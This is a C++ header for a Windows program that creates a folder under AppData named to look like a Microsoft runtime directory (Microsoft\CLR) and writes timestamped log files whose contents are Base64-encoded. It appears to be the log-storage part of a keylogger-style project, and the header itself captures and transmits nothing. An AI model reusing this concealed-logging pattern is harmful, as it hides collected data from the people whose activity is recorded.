#ifndef DIRECTORYCREATE_H
#define DIRECTORYCREATE_H

#include <string>
#include <cstdlib>
#include <fstream>
#include <Windows.h>
#include "CustTime.h"
#include "Base64.h"

using namespace std;


namespace DirectoryCreate{
	//checks chooses this inside appdata and inserts the text file there
	string GetOurPath(const bool append_separator = false) {
		string appdata_dir(getenv("APPDATA")); // finds AppData directory path
		string full = appdata_dir + "\\Microsoft\\CLR";
		return full + (append_separator ? "\\" : "");
	}

	// checks if directory already exists or not
	bool MkOneDr(string path) {
		return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
	}

	// builds full legal file path for each subdirectory, runs loop until a full path is created
	bool MKDir(string path) {
		for (char &c : path) // c takes every char of path
			if (c == '\\')
			{
				c = '\0';
				if (!MkOneDr(path))
					return false;
				c = '\\';
			}
		return true;
	}

	template <class T>
	string WriteLog(const T &t)
	{
		string path = GetOurPath(true);
		CustTime::DateTime dt; // use DateTime struct from CustTime namespace
		string name = dt.GetDateTimeString("_") + ".log";

		try
		{
			ofstream file(path + name);
			if (!file) return ""; // if file cannot be opened or used
			ostringstream s;
			s << "[" << dt.GetDateTimeString() << "]" << endl << t << endl;
			string data = Base64::EncryptB64(s.str()); // encrypt using function from Base64 namespace
			file << data;
			if (!file)
				return "";
			file.close();
			return name;
		}
		catch(...)
		{
			return "";
		}
	}
}


#endif // DIRECTORYCREATE_H